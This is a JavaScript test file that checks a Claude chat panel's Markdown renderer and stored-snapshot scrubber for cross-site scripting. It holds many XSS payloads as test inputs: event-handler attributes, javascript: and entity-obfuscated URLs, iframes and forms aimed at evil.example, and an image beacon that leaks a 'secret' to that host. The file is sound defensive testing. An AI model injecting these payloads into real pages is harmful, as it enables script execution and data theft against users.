// R01: every Markdown sink of the Claude panel goes through the allowlist
// sanitiser, and a stored snapshot is scrubbed before it reaches the page.
// The sanitiser needs parsed markup, so these run on tests/fixtures/mini-html.mjs.
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

import { createHtmlDocument, parseHtml } from './fixtures/mini-html.mjs';
import { renderMarkdown, scrubStoredHtml, escapeHtml } from '../public/shared/cp/cp-markdown.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const read = (rel) => readFileSync(join(HERE, '..', rel), 'utf8').replace(/\r\n/g, '\n');

const doc = createHtmlDocument();
// marked passes raw HTML through: the worst-case parser is the identity.
const raw = (t) => t;
const render = (html) => renderMarkdown(html, { parse: raw, doc });
const tree = (html) => parseHtml(render(html), doc);
const tags = (html) => tree(html).all.map(el => el.localName);

test('markup that can run or load code never survives', () => {
  const cases = [
    '<img src=x onerror="alert(1)">',
    '<svg onload="alert(1)"><script>alert(2)</script></svg>',
    '<script>alert(1)</script>',
    '<iframe src="https://evil.example/"></iframe>',
    '<a href="javascript:alert(1)" onclick="alert(2)">x</a>',
    '<a href="jav&#x09;ascript:alert(1)">x</a>',
    '<p style="position:fixed" onmouseover="alert(1)" id="cp-input">x</p>',
    '<form action="https://evil.example/"><input name="q"><button formaction="javascript:alert(1)">go</button></form>',
    '<math><mtext><img src=x onerror=alert(1)></mtext></math>',
    '<object data="x"></object><embed src="x"><base href="https://evil.example/"><link rel="stylesheet" href="x"><style>*{display:none}</style>',
    '<details open ontoggle="alert(1)"><summary>s</summary>body</details>',
    '<img src="https://evil.example/pixel?secret=1">',
  ];
  for (const html of cases) {
    const holder = tree(html);
    for (const el of holder.all) {
      for (const name of el.getAttributeNames()) {
        assert.ok(!/^on/i.test(name), `${name} survived in ${html}`);
        assert.ok(!['style', 'id', 'src', 'action', 'formaction', 'srcdoc'].includes(name), `${name} survived in ${html}`);
        if (name === 'href') assert.match(el.getAttribute(name), /^(https?|mailto):/, `href survived in ${html}`);
      }
      assert.ok(!['script', 'iframe', 'img', 'svg', 'math', 'form', 'input', 'button', 'object', 'embed', 'base', 'link', 'style'].includes(el.localName), `<${el.localName}> survived in ${html}`);
    }
  }
});

test('what marked emits for a transcript is kept', () => {
  // The shapes marked@14 writes for GFM: fenced code with a language class,
  // tables with alignment, nested and task lists, links, headings, quotes.
  const html = [
    '<h1>Title</h1><h3>Sub</h3>',
    '<p>Text with <strong>bold</strong>, <em>em</em>, <del>gone</del>, <code>inline</code><br>and a <a href="https://example.com/a?b=1" title="t">link</a>.</p>',
    '<pre><code class="language-js">const a = 1 &lt; 2;\n</code></pre>',
    '<table><thead><tr><th align="left">a</th><th>b</th></tr></thead><tbody><tr><td>1</td><td>2</td></tr></tbody></table>',
    '<ul><li>one<ul><li>nested</li></ul></li><li><input checked="" disabled="" type="checkbox"> done</li><li><input disabled="" type="checkbox"> todo</li></ul>',
    '<ol start="3"><li>three</li></ol>',
    '<blockquote><p>quote</p></blockquote><hr>',
  ].join('\n');
  const holder = tree(html);
  const names = holder.all.map(el => el.localName);
  for (const tag of ['h1', 'h3', 'p', 'strong', 'em', 'del', 'code', 'br', 'a', 'pre', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'ul', 'ol', 'li', 'blockquote', 'hr']) {
    assert.ok(names.includes(tag), `<${tag}> was dropped`);
  }
  const code = holder.all.find(el => el.localName === 'code' && el.getAttribute('class'));
  assert.equal(code.getAttribute('class'), 'language-js', 'the fenced block keeps its language');
  assert.equal(code.textContent, 'const a = 1 < 2;\n', 'code text is intact');
  const link = holder.all.find(el => el.localName === 'a');
  assert.equal(link.getAttribute('href'), 'https://example.com/a?b=1');
  assert.equal(link.getAttribute('rel'), 'noopener noreferrer');
  assert.match(holder.textContent, /☑ {1,2}done/, 'a checked task keeps its meaning');
  assert.match(holder.textContent, /☐ {1,2}todo/);
});

test('inline HTML a reply may carry is unwrapped, not lost', () => {
  const holder = tree('<p>press <kbd>Ctrl</kbd>+<kbd>O</kbd>, x<sup>2</sup></p><details><summary>More</summary>hidden text</details>');
  assert.equal(holder.textContent, 'press Ctrl+O, x2Morehidden text');
  assert.deepEqual(tags('<kbd>k</kbd>'), []);
});

test('without a parser, or when the parser or the sanitiser fails, the text is escaped', () => {
  const evil = '<img src=x onerror=alert(1)>\nsecond line';
  const escaped = '&lt;img src=x onerror=alert(1)&gt;<br>second line';
  assert.equal(renderMarkdown(evil, { doc }), escaped);
  assert.equal(renderMarkdown(evil, { parse: () => { throw new Error('boom'); }, doc }), escaped);
  assert.equal(renderMarkdown(evil, { parse: raw, sanitize: () => { throw new Error('no dom'); }, doc }), escaped);
  assert.equal(renderMarkdown(evil, { parse: raw, sanitize: () => undefined, doc }), escaped, 'a sanitiser that returns nothing is a failure');
  assert.equal(renderMarkdown(null, { parse: raw, doc }), '');
  assert.equal(escapeHtml('<a href="x">&</a>'), '&lt;a href=&quot;x&quot;&gt;&amp;&lt;/a&gt;');
});

test('a stored snapshot keeps the panel\'s markup and loses what can run', () => {
  const stored = [
    '<div class="msg msg-assistant" data-uuids="u1"><div class="msg-avatar"><svg viewBox="0 0 24 24"><path d="M1 1"/></svg></div>',
    '<div class="msg-body"><p>hi <img src=x onerror="alert(1)"><a href="javascript:alert(1)">x</a><a href="https://example.com/">ok</a></p>',
    '<img src="data:image/png;base64,AAAA" class="cp-attach"><img src="https://evil.example/p.png"><img src="/api/assistant/runs/r1/media/0"></div>',
    '<div class="tool-card" data-tool-id="t1" onclick="alert(2)" style="color:red"><button class="cp-copy-btn" onfocus="alert(3)">Copy</button></div>',
    '<script>alert(4)</script><iframe srcdoc="<script>alert(5)</script>"></iframe><style>*{display:none}</style>',
    '<svg><a xlink:href="javascript:alert(6)"><text>t</text></a><animate onbegin="alert(7)"/><foreignObject><body onload="alert(8)"></body></foreignObject></svg></div>',
  ].join('');
  const holder = doc.createElement('div');
  holder.appendChild(scrubStoredHtml(stored, doc));
  const all = holder.all;
  for (const el of all) {
    for (const name of el.getAttributeNames()) {
      assert.ok(!/^on/i.test(name), `${name} survived`);
      if (/href$/.test(name)) assert.ok(!/^javascript:/i.test(el.getAttribute(name)), 'a javascript: URL survived');
    }
    assert.ok(!['script', 'iframe', 'style', 'animate', 'foreignObject'].includes(el.localName), `<${el.localName}> survived`);
  }
  const card = all.find(el => el.getAttribute('class') === 'tool-card');
  assert.equal(card.getAttribute('data-tool-id'), 't1', 'data attributes stay');
  assert.equal(card.getAttribute('style'), 'color:red', 'inline style stays (the panel uses it)');
  assert.ok(all.some(el => el.localName === 'button' && el.getAttribute('class') === 'cp-copy-btn'), 'buttons stay');
  assert.ok(all.some(el => el.localName === 'path'), 'icons stay');
  assert.equal(all.find(el => el.getAttribute('class') === 'msg msg-assistant').getAttribute('data-uuids'), 'u1');
  const srcs = all.filter(el => el.localName === 'img').map(el => el.getAttribute('src'));
  assert.deepEqual(srcs, ['x', 'data:image/png;base64,AAAA', '/api/assistant/runs/r1/media/0'], 'only inline and same-server images come back');
  assert.ok(all.some(el => el.localName === 'a' && el.getAttribute('href') === 'https://example.com/'));
});

// ── The monolith cannot be imported outside a browser: pin how it uses the helper ──

test('the panel has one Markdown helper and it sanitises', () => {
  const panel = read('public/shared/ui-claude-panel.js');
  assert.match(panel, /import \{ renderMarkdown, scrubStoredHtml \} from '\.\/cp\/cp-markdown\.js';/);
  const helper = /function md\(text\) \{\n([\s\S]*?)\n\}/.exec(panel);
  assert.ok(helper, 'md() exists');
  assert.match(helper[1], /return renderMarkdown\(text, \{ parse: /);
  assert.equal((panel.match(/_marked\.parse\(/g) || []).length, 1, 'marked is called in one place only: inside md()');
  assert.ok(helper[1].includes('_marked.parse('), 'and that place is md()');
  assert.match(panel, /setCpCtx\(\{\n\s+md: \(t\) => md\(t\),/, 'the cp/ modules get the same helper');
});

test('a stored snapshot never reaches innerHTML unscrubbed', () => {
  const panel = read('public/shared/ui-claude-panel.js');
  assert.doesNotMatch(panel, /innerHTML = norm\.html/);
  assert.match(panel, /\$msgs\.replaceChildren\(scrubStoredHtml\(norm\.html\)\);/);
});

test('the cp/ modules render Markdown only through the shared helper', () => {
  for (const file of ['cp-event-rows.js', 'cp-tool-cards.js', 'cp-permissions.js']) {
    const src = read(`public/shared/cp/${file}`);
    assert.doesNotMatch(src, /_marked|marked\.parse\(/, `${file} must not parse Markdown itself`);
  }
  assert.match(read('public/shared/cp/cp-markdown.js'), /import \{ sanitizeHtmlString \} from '\.\.\/assistant\/asst-sanitize\.js';/);
});
